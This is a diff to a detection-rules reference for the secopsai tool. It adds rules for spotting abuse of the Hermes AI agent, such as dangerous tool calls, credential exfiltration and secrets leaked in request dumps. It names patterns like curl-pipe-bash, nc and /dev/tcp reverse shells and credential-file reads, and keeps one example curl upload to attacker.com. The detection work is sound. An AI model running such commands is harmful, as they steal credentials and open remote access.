@@ -1,6 +1,6 @@
 # Rules Registry
 
-Complete reference for all 12 detection rules in secopsai.
+Complete reference for the core detection rules in secopsai.
 
 ## Overview
 
@@ -10,6 +10,9 @@ The detection pipeline includes rules organized by framework:
 | ------------ | -------------------- | ------------------------------ |
 | **Baseline** | RULE-001 to RULE-007 | General security (T1110-T1218) |
 | **OpenClaw** | RULE-101 to RULE-110 | OpenClaw-specific attacks      |
+| **Hermes Agent** | RULE-120 to RULE-122 | Hermes agent/tool telemetry abuse |
+| **macOS** | RULE-201 to RULE-214 | macOS host activity |
+| **Web/App** | RULE-301 to RULE-310 | HTTP exploit patterns |
 
 ---
 
@@ -481,6 +484,79 @@ curl -F "data=@sensitive.json" https://attacker.com/upload
 
 ---
 
+## Hermes Agent Rules (RULE-120 to RULE-122)
+
+These rules detect high-confidence abuse patterns in Hermes Agent history,
+session, gateway, and tool-call telemetry. Routine Hermes gateway startup,
+provider/model errors, and normal channel activity are collected as context but
+do not become findings by default.
+
+### RULE-120: Hermes Dangerous Tool Call (T1059)
+
+**Attack:** Risky tool or shell command execution through Hermes
+
+**Pattern Matches:**
+
+- `curl ... | bash` or `wget ... | sh`
+- reverse-shell style `nc -e` or `/dev/tcp` chains
+- destructive root-level delete attempts
+- staged interpreter execution after `chmod +x` or quarantine removal
+
+**Severity:** `HIGH`
+
+**Remediation:**
+
+1. Review the Hermes session and channel identity.
+2. Confirm whether the tool call was operator-approved.
+3. Disable the relevant channel/toolset if the command was not expected.
+
+---
+
+### RULE-121: Hermes Credential Exfiltration (T1552)
+
+**Attack:** Credential discovery, staging, or outbound transfer from Hermes
+tool-call telemetry
+
+**Pattern Matches:**
+
+- Reads of `.env`, `.npmrc`, `.pypirc`, SSH keys, cloud credentials, Docker,
+  Kubernetes, or `/proc/*/environ`
+- Archive or staging commands followed by `curl`, `wget`, `scp`, `rsync`, or
+  `rclone`
+- GitHub token/auth/repo download command patterns
+
+**Severity:** `CRITICAL`
+
+**Remediation:**
+
+1. Rotate any potentially exposed SSH, cloud, GitHub, npm, PyPI, Docker,
+   Kubernetes, or CI/CD credentials.
+2. Review the Hermes session transcript and surrounding gateway logs.
+3. Temporarily disable the affected Hermes channel while investigating.
+
+---
+
+### RULE-122: Hermes Request Dump Secret Leak (T1552)
+
+**Attack:** Sensitive token material remains visible in Hermes request-dump
+telemetry after redaction
+
+**Pattern Matches:**
+
+- Bearer tokens
+- GitHub token formats
+- API-key shaped values such as `sk-*`
+
+**Severity:** `HIGH`
+
+**Remediation:**
+
+1. Move or delete the affected request dump after preserving minimum metadata.
+2. Rotate the exposed token.
+3. Keep SecOpsAI redaction enabled before syncing or sharing Hermes telemetry.
+
+---
+
 ## How to Tune Rules
 
 ### Adjust Thresholds
@@ -549,6 +625,9 @@ python evaluate_openclaw.py --labeled data/openclaw/replay/labeled/attack_mix.js
 | Restart Loop     | RULE-108   | 1.0      |
 | Data Exfil       | RULE-109   | 1.0      |
 | Malware          | RULE-110   | 1.0      |
+| Hermes Dangerous Tool Call | RULE-120 | covered by deterministic fixtures |
+| Hermes Credential Exfiltration | RULE-121 | covered by deterministic fixtures |
+| Hermes Request Dump Leak | RULE-122 | covered by deterministic fixtures |
 
 ### Overall
 
